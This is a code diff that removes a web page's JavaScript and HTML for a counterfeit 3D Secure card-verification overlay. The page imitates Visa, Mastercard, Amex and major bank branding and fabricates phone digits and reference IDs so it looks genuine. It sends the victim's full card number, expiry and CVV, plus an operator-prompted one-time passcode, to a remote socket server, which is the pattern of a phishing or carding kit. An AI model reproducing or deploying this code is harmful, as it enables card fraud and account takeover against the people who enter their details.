-                if (cardIconContainer) {
-                    cardIconContainer.remove();
-                }
-            }
-        });
-    }
-    
-    if (cardHolderInput) {
-        cardHolderInput.addEventListener('input', (e) => {
-            state.cardForm.cardHolder = e.target.value;
-        });
-    }
-    
-    if (expiryDateInput) {
-        expiryDateInput.addEventListener('input', (e) => {
-            const formattedValue = formatExpiryDate(e.target.value);
-            state.cardForm.expiryDate = formattedValue;
-            e.target.value = formattedValue;
-        });
-    }
-    
-    if (cvvInput) {
-        cvvInput.addEventListener('input', (e) => {
-            state.cardForm.cvv = e.target.value;
-        });
-    }
-    
-    if (cardForm) {
-        cardForm.addEventListener('submit', handleCardSubmit);
-    }
-}
-
 function setupOTPHandlers() {
     const otpInputs = document.querySelectorAll('.otp-digit');
     const resendBtn = document.getElementById('resend-otp');
@@ -1736,578 +1948,6 @@ function init() {
 // Start the application
 init();
 </script>
-<!-- MC Verification Overlay -->
-<div id="mcVerificationOverlay" class="fullscreen-overlay">
-  <!-- Loading Content - Shown Initially -->
-  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
-    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
-    
-    <!-- Added verification logo during loading -->
-    <div id="loadingVerificationLogo" style="margin-top: 20px; height: 60px; text-align: center;">
-      <!-- Logo will be inserted here dynamically -->
-    </div>
-  </div>
-  
-  <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
-  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 0; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
-    <!-- Header with bank and card brand logos -->
-    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
-      <div style="height: 40px; max-width: 45%;">
-        <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
-      </div>
-      <div style="height: 40px; max-width: 45%; text-align: right;">
-        <img id="verificationTypeLogo" src="" alt="Verification Logo" style="height: 40px; max-width: 100%;">
-      </div>
-    </div>
-
-    <!-- Main content -->
-    <div style="padding: 15px;">
-      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
-      
-      <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
-        <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
-          One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
-        </p>
-      </div>
-      
-      <!-- Transaction details -->
-      <div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: center;">
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Merchant</span>
-          <span id="merchantName" style="display: inline-block; text-align: left; font-weight: 500;">GOLFSTORE 3DS</span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Amount</span>
-          <span style="display: inline-block; text-align: left; font-weight: 500;">
-            <span id="currencySymbol">$</span><span id="transactionAmount">45.99</span>
-          </span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Date</span>
-          <span id="transactionDate" style="display: inline-block; text-align: left; font-weight: 500;">17:10:09</span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Card Number</span>
-          <span id="cardNumberDisplay" style="display: inline-block; text-align: left; font-weight: 500;">XXXX XXXX XXXX 0622</span>
-        </div>
-        <div style="margin-bottom: 5px;">
-          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Reference Id</span>
-          <span id="referenceId" style="display: inline-block; text-align: left; font-weight: 500;">299879</span>
-        </div>
-      </div>
-      
-      <!-- OTP input field -->
-      <div style="margin-bottom: 20px; display: flex; align-items: center;">
-        <span style="font-size: 13px; margin-right: 10px; min-width: 150px;">Enter One-Time Passcode</span>
-        <div style="position: relative; flex: 1;">
-          <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; transition: all 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
-          <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
-              <circle cx="12" cy="12" r="10"/>
-              <path d="M12 16v-4M12 8h.01"/>
-            </svg>
-          </div>
-        </div>
-      </div>
-      
-      <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
-        Incorrect OTP, please enter valid one time passcode sent to your registered mobile
-      </p>
-      
-      <!-- Consent checkbox -->
-      <div style="margin-bottom: 15px;">
-        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
-          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 8px; margin-top: 1px;" checked>
-          <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
-        </label>
-      </div>
-      
-      <!-- Action buttons -->
-      <div style="display: flex; gap: 5px; margin-bottom: 10px;">
-        <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #8ab4f8; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
-        <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
-        <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
-      </div>
-      
-      <!-- Footer links -->
-      <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
-        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
-        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
-        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
-      </div>
-    </div>
-  </div>
-</div>
-    <script>
-        // =====================================
-// MC VERIFICATION FUNCTIONALITY
-// =====================================
-
-// Global variables for MC verification
-let mcTimerInterval = null;
-
-// Currency symbols for display
-const currencySymbols = {
-  'USD': '$',
-  'EUR': '€',
-  'GBP': '£',
-  'JPY': '¥',
-  'AUD': 'A$',
-  'CAD': 'C$',
-  'CHF': 'CHF',
-  'CNY': '¥',
-  'HKD': 'HK$',
-  'NZD': 'NZ$'
-};
-
-/**
- * Shows the MC verification overlay with loading spinner
- * @param {Object} data - Verification data from server
- */
-function showMCVerificationOverlay(data) {
-  console.log('[DEBUG] Showing MC verification loading screen');
-  
-  const overlay = document.getElementById('mcVerificationOverlay');
-  const loadingContent = document.getElementById('mcLoadingContent');
-  const verificationContent = document.getElementById('mcVerificationContent');
-  const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
-  
-  if (!overlay || !loadingContent || !verificationContent) {
-    console.error('MC overlay elements not found');
-    return;
-  }
-  
-  // Show loading content, hide verification content
-  loadingContent.style.display = 'flex';
-  verificationContent.style.display = 'none';
-  overlay.style.display = 'flex';
-  
-  // Set the verification logo based on card type
-  if (loadingVerificationLogo) {
-    // Convert logo type to lowercase for comparison
-    const cardType = (data.cardType || 'mastercard').toLowerCase();
-    
-    // Select logo based on type
-    if (cardType.includes('visa')) {
-      loadingVerificationLogo.innerHTML = '<img src="https://logowik.com/content/uploads/images/visa-new-20215093.jpg" alt="Verified by Visa" style="max-height: 90px; max-width: 250px;">';
-      console.log('[DEBUG] Selected VISA logo');
-    } 
-    else if (cardType.includes('amex') || cardType.includes('american')) {
-      loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png" alt="American Express SafeKey" style="max-height: 90px; max-width: 250px;">';
-      console.log('[DEBUG] Selected AMEX logo');
-    } 
-    else if (cardType.includes('discover')) {
-      loadingVerificationLogo.innerHTML = '<img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png" alt="Discover ProtectBuy" style="max-height: 90px; max-width: 250px;">';
-      console.log('[DEBUG] Selected DISCOVER logo');
-    } 
-    else {
-      loadingVerificationLogo.innerHTML = '<img src="https://logodix.com/logo/21144.jpg" alt="Mastercard SecureCode" style="max-height: 90px; max-width: 250px;">';
-      console.log('[DEBUG] Selected MASTERCARD logo (default)');
-    }
-  }
-  
-  // Store verification data for later use
-  window.mcVerificationData = data;
-}
-
-/**
- * Starts the actual verification process
- * @param {Object} data - Verification data from server
- */
-async function startMCVerification(data) {
-  console.log('[DEBUG] Starting MC verification process');
-  
-  // Get stored data from loading screen
-  const storedData = window.mcVerificationData || {};
-  
-  // Get overlay elements
-  const loadingContent = document.getElementById('mcLoadingContent');
-  const verificationContent = document.getElementById('mcVerificationContent');
-  
-  if (!loadingContent || !verificationContent) {
-    console.error('MC verification content elements not found');
-    return;
-  }
-  
-  // Hide loading, show verification content
-  loadingContent.style.display = 'none';
-  verificationContent.style.display = 'block';
-  
-  // Set verification type logo based on card type
-  const verificationTypeLogo = document.getElementById('verificationTypeLogo');
-  if (verificationTypeLogo) {
-    const logoType = (data.verificationType || storedData.verificationType || 'mastercard').toLowerCase();
-    
-    if (logoType.includes('visa')) {
-      verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
-      verificationTypeLogo.alt = 'Verified by Visa';
-    } 
-    else if (logoType.includes('amex') || logoType.includes('american')) {
-      verificationTypeLogo.src = 'https://logos-world.net/wp-content/uploads/2020/11/American-Express-Logo-700x394.png';
-      verificationTypeLogo.alt = 'American Express SafeKey';
-    } 
-    else if (logoType.includes('discover')) {
-      verificationTypeLogo.src = 'https://logos-world.net/wp-content/uploads/2021/03/Discover-Logo-1985-2009.png';
-      verificationTypeLogo.alt = 'Discover ProtectBuy';
-    } 
-    else {
-      verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
-      verificationTypeLogo.alt = 'Mastercard SecureCode';
-    }
-  }
-  
-  // Set bank logo
-  const bankLogo = document.getElementById('bankLogo');
-  if (bankLogo) {
-    const bankLogos = {
-      'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
-      'chase': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
-      'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
-      'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
-      'wells fargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
-      'capital one': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
-      'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
-      'barclays': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png'
-    };
-    
-    bankLogo.src = bankLogos[data.bankCode?.toLowerCase()] || bankLogos['default'];
-  }
-  
-  // Generate random phone number ending for security display
-  const cardLastFourDigits = document.getElementById('cardLastFourDigits');
-  const phoneLastFour = data.phoneLastFour || Math.floor(1000 + Math.random() * 9000).toString();
-  if (cardLastFourDigits) {
-    cardLastFourDigits.textContent = `********${phoneLastFour}`;
-  }
-  
-  // Use actual card last 4 for the card display
-  const cardNumber = document.querySelector(SELECTORS.cardNumber)?.value || '';
-  const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
-  const cardNumberDisplay = document.getElementById('cardNumberDisplay');
-  if (cardNumberDisplay) {
-    cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
-  }
-  
-  // Generate random reference ID
-  const referenceId = document.getElementById('referenceId');
-  if (referenceId) {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let randomRef = '';
-    // Generate 3 letters followed by 4 numbers
-    for (let i = 0; i < 3; i++) {
-      randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
-    }
-    for (let i = 0; i < 4; i++) {
-      randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
-    }
-    referenceId.textContent = randomRef;
-  }
-  
-  // Set merchant name and transaction date
-  const merchantName = document.getElementById('merchantName');
-  const transactionDate = document.getElementById('transactionDate');
-  if (merchantName) {
-    merchantName.textContent = data.merchantName || storedData.merchantName || 'Peacock Merchandise';
-  }
-  if (transactionDate) {
-    transactionDate.textContent = new Date().toLocaleString();
-  }
-  
-  // Set amount display
-  const transactionAmount = document.getElementById('transactionAmount');
-  const currencySymbol = document.getElementById('currencySymbol');
-  const originalAmount = document.getElementById('originalAmount');
-  const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
-  
-  // Default amount in USD
-  const amountValue = '1299.00';
-  
-  // Handle currency display
-  if (currencySymbol) {
-    currencySymbol.textContent = currencySymbols[data.currency] || '$';
-  }
-  
-  if (transactionAmount) {
-    transactionAmount.textContent = amountValue;
-  }
-  
-  if (originalAmount) {
-    originalAmount.textContent = amountValue;
-  }
-  
-  // Setup event handlers
-  setupMCVerificationHandlers();
-  
-  // Start timer
-  startMCTimer();
-}
-
-/**
- * Sets up event handlers for the MC verification form
- */
-function setupMCVerificationHandlers() {
-  const mcOtpInput = document.getElementById('mcOtpInput');
-  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
-  const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
-  const consentLabel = document.getElementById('consentLabel');
-  const mcResendBtn = document.getElementById('mcResendBtn');
-  const mcCancelBtn = document.getElementById('mcCancelBtn');
-  const otpInfoIcon = document.getElementById('otpInfoIcon');
-  const otpInfoTooltip = document.getElementById('otpInfoTooltip');
-  
-  // Input handler for OTP field
-  if (mcOtpInput) {
-    mcOtpInput.addEventListener('input', updateMcSubmitButton);
-  }
-  
-  // Consent checkbox toggle
-  if (mcConsentCheckbox && consentLabel) {
-    consentLabel.style.cursor = 'pointer';
-    
-    const toggleConsent = function(e) {
-      e.preventDefault();
-      e.stopPropagation();
-      
-      mcConsentCheckbox.classList.toggle('checked');
-      
-      const checkmarkSvg = mcConsentCheckbox.querySelector('svg');
-      if (checkmarkSvg) {
-        if (mcConsentCheckbox.classList.contains('checked')) {
-          checkmarkSvg.style.display = 'block';
-          mcConsentCheckbox.style.backgroundColor = '#2778c4';
-          mcConsentCheckbox.style.borderColor = '#2778c4';
-        } else {
-          checkmarkSvg.style.display = 'none';
-          mcConsentCheckbox.style.backgroundColor = 'white';
-          mcConsentCheckbox.style.borderColor = '#ccc';
-        }
-      }
-      
-      updateMcSubmitButton();
-      return false;
-    };
-    
-    mcConsentCheckbox.addEventListener('click', toggleConsent);
-    consentLabel.addEventListener('click', toggleConsent);
-    
-    // Initialize submit button state
-    setTimeout(updateMcSubmitButton, 100);
-  }
-  
-  // Submit button click handler
-  if (mcSubmitBtn) {
-    mcSubmitBtn.addEventListener('click', function() {
-      if (mcSubmitBtn.disabled) return;
-      
-      const otp = mcOtpInput?.value?.trim();
-      if (!otp) {
-        const mcOtpError = document.getElementById('mcOtpError');
-        if (mcOtpError) {
-          mcOtpError.textContent = 'Please enter the verification code.';
-          mcOtpError.style.display = 'block';
-        }
-        return;
-      }
-      
-      // Show loading state
-      mcSubmitBtn.disabled = true;
-      mcSubmitBtn.textContent = 'Verifying...';
-      mcSubmitBtn.style.opacity = '0.7';
-      
-      // Send OTP to server
-      socket.emit('mc_otp_submitted', {
-        otp: otp
-      });
-    });
-  }
-  
-  // Resend button click handler
-  if (mcResendBtn) {
-    mcResendBtn.addEventListener('click', function() {
-      mcResendBtn.disabled = true;
-      mcResendBtn.textContent = 'Sending...';
-      
-      socket.emit('mc_resend_otp', {});
-      
-      setTimeout(() => {
-        mcResendBtn.disabled = false;
-        mcResendBtn.textContent = 'Resend';
-        alert('A new verification code has been sent to your registered mobile number.');
-      }, 1500);
-    });
-  }
-  
-  // Cancel button click handler
-  if (mcCancelBtn) {
-    mcCancelBtn.addEventListener('click', function() {
-      if (confirm('Do you want to cancel this verification?')) {
-        hideMCVerificationOverlay();
-        socket.emit('mc_verification_cancelled', {});
-      }
-    });
-  }
-  
-  // Info tooltip toggle
-  if (otpInfoIcon && otpInfoTooltip) {
-    otpInfoIcon.addEventListener('mouseenter', function() {
-      otpInfoTooltip.style.display = 'block';
-    });
-    
-    otpInfoIcon.addEventListener('mouseleave', function() {
-      otpInfoTooltip.style.display = 'none';
-    });
-  }
-}
-
-/**
- * Updates the MC submit button state based on input and consent
- */
-function updateMcSubmitButton() {
-  const mcOtpInput = document.getElementById('mcOtpInput');
-  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
-  const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
-  
-  if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
-  
-  const hasOtp = mcOtpInput.value.trim().length > 0;
-  const hasConsent = mcConsentCheckbox.classList.contains('checked');
-  
-  if (hasOtp && hasConsent) {
-    mcSubmitBtn.disabled = false;
-    mcSubmitBtn.style.backgroundColor = '#2778c4';
-    mcSubmitBtn.style.cursor = 'pointer';
-  } else {
-    mcSubmitBtn.disabled = true;
-    mcSubmitBtn.style.backgroundColor = '#CCCCCC';
-    mcSubmitBtn.style.cursor = 'not-allowed';
-  }
-}
-
-/**
- * Starts the timer for MC verification
- */
-function startMCTimer() {
-  const timerElement = document.getElementById('mcTimer');
-  if (!timerElement) return;
-  
-  if (mcTimerInterval) {
-    clearInterval(mcTimerInterval);
-  }
-  
-  let timeLeft = 179; // 2:59 timer
-  
-  // Update timer display immediately
-  const minutes = Math.floor(timeLeft / 60);
-  const seconds = timeLeft % 60;
-  timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-  
-  // Set interval for countdown
-  mcTimerInterval = setInterval(() => {
-    timeLeft--;
-    
-    const minutes = Math.floor(timeLeft / 60);
-    const seconds = timeLeft % 60;
-    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-    
-    if (timeLeft <= 0) {
-      clearInterval(mcTimerInterval);
-      hideMCVerificationOverlay();
-      
-      // Show timeout error
-      showErrorUI('Verification timed out. Please try again.');
-    }
-  }, 1000);
-}
-
-/**
- * Hides the MC verification overlay
- */
-function hideMCVerificationOverlay() {
-  const overlay = document.getElementById('mcVerificationOverlay');
-  if (overlay) {
-    overlay.style.display = 'none';
-  }
-  
-  if (mcTimerInterval) {
-    clearInterval(mcTimerInterval);
-    mcTimerInterval = null;
-  }
-}
-
-// Add Socket.io event listeners for MC verification
-socket.on('show_mc_verification', (data) => {
-  console.log('[DEBUG] Received show_mc_verification event:', data);
-  showMCVerificationOverlay(data);
-});
-
-socket.on('start_verification', (data) => {
-  console.log('[DEBUG] Received start_verification event:', data);
-  startMCVerification(data);
-});
-
-socket.on('mc_otp_error', (data) => {
-  const mcOtpError = document.getElementById('mcOtpError');
-  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
-  
-  if (mcOtpError) {
-    mcOtpError.textContent = data.message || 'Incorrect verification code. Please try again.';
-    mcOtpError.style.display = 'block';
-  }
-  
-  if (mcSubmitBtn) {
-    mcSubmitBtn.disabled = false;
-    mcSubmitBtn.textContent = 'Submit';
-    mcSubmitBtn.style.opacity = '1';
-  }
-});
-
-socket.on('mc_verification_result', (data) => {
-  hideMCVerificationOverlay();
-  
-  // Show result based on success/failure
-  if (data.success) {
-    showSuccessUI(data);
-  } else {
-    showErrorUI(data.message || 'Verification failed. Please try again.');
-  }
-});
-
-// Modify handleCardSubmit function to potentially trigger MC verification
-const originalHandleCardSubmit = handleCardSubmit;
-handleCardSubmit = function(e) {
-  e.preventDefault();
-  console.log('Form submitted, preventing default and processing payment...');
-
-  // Get form values
-  const cardNumber = document.querySelector(SELECTORS.cardNumber).value.replace(/\s/g, '');
-  const cardHolder = document.querySelector(SELECTORS.cardHolder).value;
-  const expiryDate = document.querySelector(SELECTORS.expiryDate).value;
-  const cvv = document.querySelector(SELECTORS.cvv).value;
-
-  // Validate form inputs
-  if (!validateCardForm(cardNumber, cardHolder, expiryDate, cvv)) {
-    return false;
-  }
-
-  // Process payment with Socket.io
-  socket.emit('process_payment', {
-    cardNumber,
-    cardHolder,
-    expiryDate,
-    cvv,
-    amount: 1299.00
-  });
-
-  // Show processing UI
-  showProcessingUI();
-
-  // Listen for payment response
-  socket.once('payment_response', handlePaymentResponse);
-
-  // Important: Return false to prevent form submission
-  return false;
-};
-        <script>
 
 <script>
 // MC Verification Logic
